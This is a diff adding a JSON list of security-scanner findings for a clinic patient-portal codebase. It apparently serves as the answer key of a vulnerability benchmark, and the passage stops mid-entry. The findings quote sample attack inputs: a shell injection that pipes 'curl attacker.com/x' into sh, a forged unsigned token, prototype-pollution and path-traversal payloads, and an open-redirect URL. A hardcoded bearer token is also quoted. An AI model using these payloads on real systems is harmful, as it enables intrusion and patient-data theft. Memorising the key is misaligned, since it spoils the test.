@@ -1,0 +1,1193 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.eval-injection-billing-formula",
+      "path": "lib/billing-formulas.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "evaluateSelfPayAdjustment builds a `new Function` from an admin-configurable formula string and evaluates it with `with (context) { return (...) }`. Any actor able to write the clinic's `self_pay_adjustment_formula` setting (an admin-panel bug, CSRF, or compromised admin session) achieves arbitrary server-side JavaScript execution. The sibling function evaluateStandardAdjustment dispatches through a fixed lookup table instead, confirming this is the unsafe path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection",
+      "path": "lib/document-catalog.ts",
+      "start": {
+        "line": 56,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 59,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findLocationDocumentsByStickySearch concatenates the unescaped stickySearchTerm directly into an XPath expression (`//document[contains(name, '${stickySearchTerm}')]`). This term originates from an unauthenticated GET query param / cookie in app/api/documents/board-search/route.ts, letting an attacker break out of the contains() predicate to alter query logic (e.g. via a payload containing `'] | //*[contains(name,'`). The sibling findLocationDocumentsByVerifiedStickySearch (line 68-73) escapes the same input with escapeXPathString, confirming this is the unsafe twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-jwt-signature-verification",
+      "path": "lib/network-access.ts",
+      "start": {
+        "line": 40,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readResourceGrantClaims decodes the base64url JWT-like payload of the `clinic_partner_grant` cookie/token and returns it as trusted claims WITHOUT recomputing or checking the HMAC signature (contrast with verifyResourceGrant at lines 57-74, which does an HMAC recompute + timingSafeEqual + expiry check). It is used directly for an authorization decision in app/api/reports/utilization/route.ts:20-22 (`claims.scope !== 'utilization-export'`), so any attacker can forge `header.base64url({\"partnerId\":\"x\",\"scope\":\"utilization-export\",\"exp\":9999999999}).anything` as the cookie value to fully bypass authentication and read the clinic's utilization report data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.forged-partner-grant-bypasses-auth",
+      "path": "app/api/reports/utilization/route.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "handleResourceCheck falls back to readResourceGrantClaims(grantToken) (lib/network-access.ts:40-49), which never verifies the token's HMAC signature. An attacker with no credentials can forge a `clinic_partner_grant` cookie and pass this authorization check to access provider utilization statistics.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "lib/staff-directory.ts",
+      "start": {
+        "line": 46,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryEmployeeDirectory builds an LDAP filter `(cn=*${searchTerm}*)` by directly interpolating attacker-controlled searchTerm (reachable via app/api/staff/contact-lookup/route.ts) with no escaping of LDAP metacharacters (*, (, ), \\). The sibling findUserByEmail (lines 51-66) escapes via escapeLdapFilter first, confirming the intended safe pattern is missing here. This allows filter-injection to broaden search scope or return unintended directory entries.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.deep-assign-lobby-preferences",
+      "path": "lib/signage.ts",
+      "start": {
+        "line": 48,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 72,
+        "col": 34,
+        "offset": 0
+      },
+      "extra": {
+        "message": "deepAssign recursively copies every enumerable key from an attacker-controlled object (the `clinic_lobby_prefs` cookie, JSON.parsed and passed straight in via registerLobbyBoardPreferences at line 68-72, called from app/api/dashboard/lobby-board/route.ts:19) onto a plain object with no `__proto__`/`constructor`/`prototype` denylist. A payload such as `{\"__proto__\":{\"polluted\":\"x\"}}` lets an unauthenticated caller (this route only requires a session, not a role) pollute Object.prototype process-wide. The sibling registerQueueMonitorPreferences (lines 90-102) runs the same kind of cookie payload through sanitizeConfigInput's CONFIG_KEY_DENYLIST first, confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-label-printer",
+      "path": "lib/label-print-station.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "printSpecimenLabel builds a shell command string `label-driver --preset ${labelPreset} --station ${stationId}` from caller-supplied values and runs it via `spawn(\"sh\", [\"-c\", ...], { shell: true })`. Reached from app/api/staff/label-print-station/route.ts, which only trims the values with no allowlist and only requires an authenticated session (any role). An attacker can inject shell metacharacters (e.g. `; curl attacker.com/x | sh #`) into labelPreset or stationId to execute arbitrary OS commands. The sibling printSpecimenLabelForChartingStation (lines 35-44) validates labelPreset against a fixed LABEL_PRESETS allowlist and uses spawnSync with shell:false and an argv array.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-referral-letter",
+      "path": "lib/reporting.ts",
+      "start": {
+        "line": 57,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 64,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderReferralLetter builds `outputPath` from an attacker-controlled `format` query param and passes it, along with sourcePath, into `execSync(`pandoc ${sourcePath} -o ${outputPath}`)` \u2014 a shell-interpolated command. Reached via GET app/api/visit-summaries/referral-letter/route.ts (`format = searchParams.get(\"format\") ?? \"pdf\"`, line 11) with no validation against an allowlist. An attacker with visit-summary view access can inject shell metacharacters into `format` to execute arbitrary commands on the server. The sibling renderIntakePacket (lines 74-87) validates format against INTAKE_PACKET_FORMATS and uses spawnSync with shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-order-by",
+      "path": "lib/reporting.ts",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchSortedPatientDirectory concatenates the attacker-controlled `column` value (from the `x-directory-sort` request header, app/api/reports/patient-directory/route.ts:8-9) directly into a raw SQL string executed via `prisma.$queryRawUnsafe`, with no allowlist validation. An attacker (CLINIC_ADMIN or FRONT_DESK role required, but no further validation) can break out of the quoted identifier to perform SQL injection. The sibling fetchSortedAppointmentQueue (lines 43-48) validates against a fixed [\"startsAt\",\"status\"] list before using Prisma.raw, confirming this is the unsafe twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.partner-document-fetch",
+      "path": "lib/partner-document-import.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 45,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importSharedReferralPacket fetches `documentSourceUrl` with no scheme/host validation. This URL comes straight from the client-supplied `x-partner-document-source` request header in app/api/partners/referral-packet-import/route.ts:15, letting a CLINIC_ADMIN/FRONT_DESK-authenticated caller (or an attacker relaying a forged partner webhook) make the server fetch arbitrary internal/cloud-metadata URLs. The response byte length is echoed back to the caller (`bytes: content.length`), providing a blind SSRF oracle. The sibling importVerifiedClearinghousePacket (lines 42-67) validates via isAllowedPartnerDocumentUrl against ALLOWED_PARTNER_HOSTS and requires https before fetching.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.missing-auth-record-archive",
+      "path": "app/api/records/archive/route.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 36,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST handler performs no requireUser()/requireRole() check before calling archiveHandledRecord(documentId), which updates any Document's status to ARCHIVED. Any unauthenticated caller can hide arbitrary patient records (labs, insurance scans) from the review queue by guessing/enumerating documentId. The sibling app/api/records/restore/route.ts (lines 28-30) calls requireUser() plus assertCanReviewDocument(user) for the equivalent operation.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.idor-prescription-lookup",
+      "path": "app/api/prescriptions/dispense-check/route.ts",
+      "start": {
+        "line": 5,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET only calls requireUser() (any authenticated role, including PATIENT) then fetches an arbitrary prescription by the client-supplied `x-prescription-ref` header via fetchPrescriptionForHandoffScan, which does an unscoped prisma.prescription.findUnique with no ownership check (lib/pharmacy-ops.ts:11-16). Any authenticated patient can read any other patient's medication name, dosage, instructions, and full name by supplying a different prescription id. The sibling app/api/prescriptions/pickup-status/route.ts requires Role.PATIENT and calls fetchOwnedPrescriptionForHandoffScan(user.patientProfile.id, prescriptionRef), properly scoping to the caller.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.idor-billing-scope-claim",
+      "path": "app/api/portal/billing-scope/route.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST accepts any client-supplied `patientId` with no check that it belongs to (or is a linked dependent of) the calling patient, then issues an `encodeBillingAccessClaim` cookie for it. encodeBillingAccessClaim (lib/context.ts:74-76) is plain base64 JSON, not signed, so the claim is also trivially forgeable client-side. Combined with the unscoped lookup in billing-summary/route.ts, this lets any patient read any other patient's billing/insurance data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-345: Insufficient Verification of Data Authenticity"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.idor-billing-summary-unscoped-lookup",
+      "path": "app/api/portal/billing-summary/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchActiveBillingScopeSummary does `prisma.patientProfile.findUnique({ where: { id: claim.patientId } })` with no check that claim.patientId belongs to the calling user, returning insuranceProvider and insuranceMemberId for whatever patientId is in the (forgeable, unsigned) billing-scope claim cookie. Contrast with app/api/portal/dependent-summary/route.ts:12-14, which scopes with `findFirst({ where: { id: patientId, userId } })`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-auth-lobby-board-resume",
+      "path": "app/api/dashboard/lobby-board-resume/route.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET handler performs no session/auth check before parsing the `lobby_board_roster` cookie and returning queue state (nowServing/onDeck ticket data). The sibling lobby-board/route.ts calls requireUser() for the equivalent board. This exposes patient-queue identifying information with no authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-auth-queue-monitor-resume",
+      "path": "app/api/dashboard/queue-monitor-resume/route.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET handler performs no session/auth check before parsing the `queue_monitor_roster` cookie and returning queue state, mirroring the same gap in lobby-board-resume/route.ts. The sibling queue-monitor/route.ts requires a session for the equivalent board.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-auth-document-board-search",
+      "path": "app/api/documents/board-search/route.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 46,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET handler performs no requireUser()/session check before returning the clinic-wide verified-document catalog search results, exposing document names/categories to unauthenticated requests. This search term also flows into the XPath-injection sink in lib/document-catalog.ts:58, making this endpoint an unauthenticated entry point for that injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.forms-library-template",
+      "path": "lib/forms-library.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadFrontDeskFormTemplate joins attacker-controlled `category` and `formName` (from the POST JSON body in app/api/forms/library-item/route.ts, lines 8-14) into a file path with path.join and reads it with no containment check or basename sanitization. path.join normalizes `..` segments, so a payload like category=\"../../../..\", formName=\"etc/passwd\" reads arbitrary files off disk (bounded only by the FRONT_DESK/CLINIC_ADMIN role check). The sibling loadIntakePrintTemplate (lines 21-25) reduces formName with path.basename() first.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.missing-authorization-patient-import",
+      "path": "app/actions.ts",
+      "start": {
+        "line": 1041,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1088,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importPatientsAction calls only requireUser() (no role check) before bulk-creating up to 100 PatientProfile records with full PII (name, DOB, address, insurance) from an uploaded CSV. Any authenticated user, including a PATIENT role account, can inject arbitrary patient records into the clinic system. All sibling admin/staff bulk-write actions in this file gate on requireRole([...]).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.clinical-photo-upload",
+      "path": "app/actions.ts",
+      "start": {
+        "line": 1155,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1157,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachClinicalPhotoToChartAction joins the raw, unsanitized client-supplied `file.name` into the filesystem destination path (`path.join(clinicalPhotoRoot(), file.name)`) with no basename stripping or traversal check, then writes the uploaded bytes there. A crafted filename containing `../` segments can write the photo outside the intended clinicalPhotoRoot directory. The sibling uploadDocumentAction (lines 368-412) strips the extension and generates a random token filename instead of trusting the client-supplied name.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.referral-drop-export",
+      "path": "lib/document-export.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportDocumentToReferringDrop joins document.originalName (the unsanitized client-supplied filename captured verbatim at upload time in app/actions.ts:394, `originalName: file.name`) into a filesystem write path with no containment check, unlike the sibling readLegacyScanForMigration (lines 35-42) in the same file, which resolves the path and explicitly verifies it stays under the staging root. A document uploaded with a traversal-crafted name can cause writes outside the referral-drop directory when later exported via app/actions.ts:422.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-auth-workstation-board",
+      "path": "app/api/staff/workstation-board/route.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET handler has no requireUser()/requireRole() call. Authorization relies solely on validateSharedWorkstationUnlock(workstationId) (lib/workstation-lock.ts:14-17), an in-memory Map keyed purely by the client-supplied workstationId query param with no binding to the caller's own session and no expiry \u2014 an entry persists until explicitly locked. Anyone who supplies a currently-unlocked workstationId (e.g. via network sniffing, guessing, or simple enumeration of station names) gets full patient names, provider names, and appointment status with zero authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-auth-triage-station-board",
+      "path": "app/api/staff/triage-station-board/route.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "GET handler has no requireUser()/requireRole() call, relying solely on validateSharedTriageStationUnlock(workstationId) \u2014 a client-supplied query param looked up in an in-memory Map. Although this variant has a 15-minute TTL (lib/workstation-lock.ts:23,30-33), the endpoint itself remains reachable by any unauthenticated caller who knows/guesses a currently-unlocked workstationId, exposing patient names, provider names, and appointment status.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.cbc-padding-oracle-share-link",
+      "path": "lib/share-links.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 44,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createVisitSummaryShareLink/openVisitSummaryShareLink use unauthenticated AES-256-CBC and the catch block explicitly distinguishes a padding failure (`throw new Error(\"Share link padding is invalid\")`) from a generic decrypt failure (line 38-41). This distinct, attacker-observable error is the classic Vaudenay padding-oracle setup, letting an attacker decrypt or forge share-link tokens without the key via repeated requests. Also, the payload's issuedAt timestamp is never checked against any TTL, so tokens never expire. The sibling createAppointmentConfirmationLink/openAppointmentConfirmationLink (lines 46-81) use authenticated AES-256-GCM and collapse every failure into one generic message.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-696: Incorrect Behavior Order",
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-partner-bearer-token",
+      "path": "lib/referral-network.ts",
+      "start": {
+        "line": 22,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "A live-looking bearer token (`Bearer rfn_9f2c7a41e8b0d3f6a5c9e2b7d4f1a8c3`) is hardcoded directly in source rather than sourced from environment/secret storage. Anyone with source access (or this benchmark's public repo) obtains a credential usable against the referral network partner API. The sibling submitDurableEquipmentOrder (lines 38-64) correctly requires DME_NETWORK_PARTNER_TOKEN from the environment and throws if missing.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.kiosk-roster-xml-no-doctype-guard",
+      "path": "lib/kiosk-roster-state.ts",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreKioskRosterFromCookie parses the fully attacker-controlled `lobby_board_roster` cookie value as XML with xml2js's Parser and no DOCTYPE rejection, reachable with zero authentication via app/api/dashboard/lobby-board-resume/route.ts. The sibling restoreFrontDeskRosterFromCookie (lines 36-43) explicitly rejects any input containing `<!DOCTYPE` before parsing, confirming the intended defense is missing here. This allows internal DTD entity-expansion (billion-laughs) denial-of-service against the parser.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference",
+            "CWE-776: Improper Restriction of Recursive Entity References in DTDs"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-xss-refill-handoff-slip",
+      "path": "lib/reporting.ts",
+      "start": {
+        "line": 141,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 142,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderRefillHandoffSlip interpolates prescription.instructions and prescription.patientMessage into an HTML string with no escaping. patientMessage is patient-supplied free text submitted via the refill request form and persisted through app/actions.ts. app/api/prescriptions/handoff-slip/route.ts serves the resulting string with Content-Type text/html, so a patient can plant `<script>` in their refill message that executes in the pharmacist/clinician's browser when the handoff slip is opened/printed. The sibling renderMessageThreadDigest in the same file (lines 155-167) uses escapeHtml() on every interpolated field.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect-appointment-confirm",
+      "path": "app/api/appointments/confirm/route.ts",
+      "start": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "continueAfterConfirmation redirects to a destination built from the client-supplied `x-redirect-url` header. The `requested.startsWith(\"/\")` check does not block protocol-relative URLs (e.g. `//evil.com/x`), which `new URL(destination, request.url)` resolves to `https://evil.com/x`. Any client able to set this header (the docstring says the mobile app forwards it from a deep link) can redirect the unauthenticated confirmation flow to an attacker-controlled origin right after a real appointment is confirmed \u2014 a phishing vector.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "app/api/partners/utilization-export/route.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The response reflects any client-supplied `Origin` header back as Access-Control-Allow-Origin while also setting Access-Control-Allow-Credentials: true, with no allowlist check. The sibling app/api/partners/referral-status/route.ts (lines 23-27) checks ALLOWED_PARTNER_ORIGINS before reflecting. This lets any website read the credentialed cross-origin response for any browser holding a valid partner grant, defeating the same-origin policy.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.idor-refill-queue-clinician-filter",
+      "path": "app/api/prescriptions/queue-view/route.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST accepts an arbitrary `criteria` object and passes it to findRefillQueueMatchingCriteria (lib/reporting.ts:113-127), whose REFILL_QUEUE_FIELDS allowlist includes `clinicianId` (lib/reporting.ts:105). A CLINICIAN caller (not just CLINIC_ADMIN) can therefore supply another clinician's id as `clinicianId` in the request body and retrieve that clinician's entire refill queue (other patients' prescriptions and names), bypassing the same-clinician restriction enforced elsewhere via canDecideRefill (lib/permissions.ts).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.unrestricted-where-clause-message-triage",
+      "path": "app/api/messages/triage-view/route.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The client-supplied `criteria` object is spread AFTER the default `assignedToId: user.id` (`{ assignedToId: user.id, ...criteria }`), so any key in the body \u2014 including assignedToId itself \u2014 overrides the intended \"assigned to me\" scoping. findMessageThreadsMatchingCriteria (lib/reporting.ts:96-102) applies the merged object directly as an unrestricted Prisma `where` clause with no per-thread canViewPatient check. Any CLINICIAN/FRONT_DESK caller can retrieve message threads for patients outside their care by supplying a broader or overriding filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.dependent-profile-update",
+      "path": "app/api/portal/dependent-summary/route.ts",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "processAllocation spreads the entire client-supplied request body (minus only `patientId`) directly into a Prisma update `data: { ...updates }` with no field allowlist. PatientProfile.userId is a real @unique column (prisma/schema.prisma:130); a patient editing their own linked dependent's record can include `userId` or `primaryProviderId` in the JSON body to reassign the profile's owning user or provider, since nothing strips those fields.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.referral-intake-packet",
+      "path": "app/actions.ts",
+      "start": {
+        "line": 790,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 798,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyReferralIntakePacketAction parses an arbitrary JSON `packet` field and spreads it directly into `prisma.patientProfile.update({ where: { id: patientId }, data: fields })` with no field allowlist, letting a caller set arbitrary PatientProfile columns (including userId/primaryProviderId). The sibling applyVerifiedReferralIntakePacketAction (lines 832+) validates the same kind of packet against a `.strict()` zod schema of specific demographic fields first.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.content-disposition-handoff-export",
+      "path": "lib/document-export.ts",
+      "start": {
+        "line": 50,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 53,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
